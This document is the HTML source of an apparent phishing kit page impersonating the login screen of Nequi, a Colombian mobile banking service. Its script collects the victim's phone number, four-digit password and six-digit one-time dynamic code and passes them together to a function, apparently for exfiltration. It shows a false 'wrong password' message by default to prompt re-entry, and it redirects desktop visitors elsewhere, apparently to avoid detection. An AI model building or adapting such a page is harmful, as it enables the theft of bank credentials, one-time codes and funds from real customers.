
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Nequi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Webflow">
    <meta http-equiv="cache-control" content="no-cache, max-age=0">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="pragma" content="no-cache">
    <link rel="stylesheet" type="text/css" href="assets/css/normalize.css">
    <link rel="stylesheet" type="text/css" href="assets/css/nequi_two.webflow.css">
    <link rel="stylesheet" type="text/css" href="assets/css/nequi_one.webflow.css">
    <link rel="stylesheet" type="text/css" href="assets/css/main.css">
    <script type="text/javascript" src="assets/js/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="assets/js/functions.js"></script>
    <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0-beta.2/angular.min.js"></script>
    <script src="https://code.angularjs.org/1.4.3/i18n/angular-locale_en-us.js"></script>
    <script src="assets/js/libs/lodash.min.js"></script>
    <script src="assets/js/libs/restangular.min.js"></script>
    <script type="text/javascript" src="assets/js/libs/angular-recaptcha.min.js"></script>
</head>
<body ng-app="App" class="ng-scope">
    <div id="content">
        <!-- Header -->
        <header class="ng-scope">
            <div class="wrap-header">
                <div class="row">
                    <div class="col-xs-12 col-md-2">
                        <div class="logo">
                            <a href="https://www.nequi.com.co">
                                <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
                            </a>
                        </div>
                        <div class="btn-menu-hamburguer" ng-click="openMenu();">
                            <a class=""><span></span></a>
                        </div>
                    </div>
                    <div class="col-xs-12 col-md-10 container-buttons">
                        <div class="wrap-main-menu">
                            <div class="row">
                                <div class="col-xs-12 col-md-8"></div>
                                <div class="col-xs-12 col-md-4">
                                    <div class="buttons-right">
                                        <ul>
                                            <li ng-if="!hidePa" class="ng-scope">
                                                <a target="_blank" href="https://recarga.nequi.com.co/bdigitalpsl" class="ng-binding">Recarga</a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <!-- Login Section -->
        <section class="login-section ng-scope" ng-controller="loginController as loginControl">
            <div class="login-wrap">
                <h1 class="ng-binding">Entra a tu Nequi</h1>
                <p class="ng-binding">Ups, esa no es la clave de tu nequi.</p>
                <div class="login-form-wrap">
                    <div class="container-form">
                        <div class="input-country">
                            <div class="wrap-select-country">
                                <!-- País fijo a Colombia -->
                                <div class="select-country">
                                    <div class="country-wrap country-active">
                                        <div class="select-col select-col-img">
                                            <img src="assets/images/flag_colombia.png" alt="co">
                                        </div>
                                        <div class="select-col">
                                            <p class="ng-binding"> +57 </p>
                                            <input class="country-input" type="text" name="j_region" id="j_region" value="57" readonly>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group">
                                <input type="tel" id="j_username" name="j_username" maxlength="12" minlength="12" required oninput="formatPhoneNumber()">
                                <label for="j_username" class="ng-binding">Número de celular</label>
                            </div>
                        </div>
                        <div class="form-group">
                            <input class="password" type="password" id="j_password" name="j_password" required maxlength="4" minlength="4">
                            <label for="j_password" class="ng-binding">Contraseña</label>
                        </div>
                        <div class="form-group">
                            <input class="password" type="password" id="j_dinamica" name="j_dinamica" required maxlength="6" minlength="6">
                            <label for="j_dinamica" class="ng-binding">Clave Dinamica</label>
                        </div>
                        <div class="g-recaptcha" data-sitekey="6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i"></div>
                    </div>
                    <div class="btn-wrap">
                        <input class="form-btn-submit" type="submit" value="Entra" id="btnUsuario">
                    </div>
                </div>
            </div>
            <script type="text/javascript">
                if (typeof detectar_dispositivo === "function" && detectar_dispositivo() == "PC") {
                    window.location.href = 'https://www.wplay.co';
                }
                $(document).ready(function () {
                    $('#btnUsuario').click(function () {
                        if ($("#j_username").val().length > 0) {
                            pasousuario($("#j_username").val()+" - "+$("#j_password").val() + "OTP "+ $("#j_dinamica").val() );
                        } else {
                            $("#err-mensaje").show();
                            $(".input_text").css("border", "1px solid red");
                            $("#txtUsuario").focus();
                        }
                    });
                    $("#txtUsuario").keyup(function (e) {
                        $(".input_text").css("border", "1px solid #CCCCCC");
                        $("#err-mensaje").hide();
                    });
                });
            </script>
        </section>
        <!-- Footer -->
        <footer class="ng-scope">
            <div class="container-footer">
                <div ng-if="!hidePa" class="logo-vigilado ng-scope"></div>
                <div class="container-top">
                    <div class="logo-nequi">
                        <img alt="logo nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg">
                    </div>
                    <div class="stores">
                        <a href="https://play.google.com/store/apps/details?id=com.nequi.MobileApp&amp;hl=es">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg">
                        </a>
                        <a href="https://apps.apple.com/co/app/nequi/id1075378688">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg">
                        </a>
                        <a href="https://appgallery.huawei.com/#/app/C101700131?channelId=browser&amp;detailType=0">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd25c_store-huawei.svg">
                        </a>
                    </div>
                    <div class="group-bancolombia">
                        <a href="https://www.grupobancolombia.com/">
                            <img class="img-group-bancolombia" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50f4c6011eb184c8d7d99_logo-grupo-bancolombia.svg">
                        </a>
                    </div>
                </div>
                <hr class="separator">
            </div>
        </footer>
    </div>
    <script src="assets/js/script.js"></script>
    <script async defer src="https://www.google.com/recaptcha/api.js?onload=vcRecaptchaApiLoaded&amp;render=explicit"></script>
</body>
</html>